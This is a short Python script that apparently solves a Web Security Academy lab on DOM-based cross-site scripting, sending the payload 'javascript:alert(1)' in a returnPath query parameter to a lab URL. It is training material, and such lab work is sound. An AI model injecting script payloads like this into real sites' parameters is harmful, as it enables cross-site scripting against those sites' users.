#############################################################
#
# Lab: DOM XSS in jQuery anchor href attribute sink using 
#      location.search source
#
# Hack Steps: 
#      1. Inject payload in the returnPath query parameter
#      2. Observe that the alert function has been called
#
#############################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a48007b031cc101827ccf990076003f.web-security-academy.net"

def main():
    payload = "javascript:alert(1)"

    print("❯❯ Injecting payload in the returnPath query parameter.. ", end="", flush=True)
    
    try:
        requests.get(f"{LAB_URL}/feedback?returnPath={payload}")

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()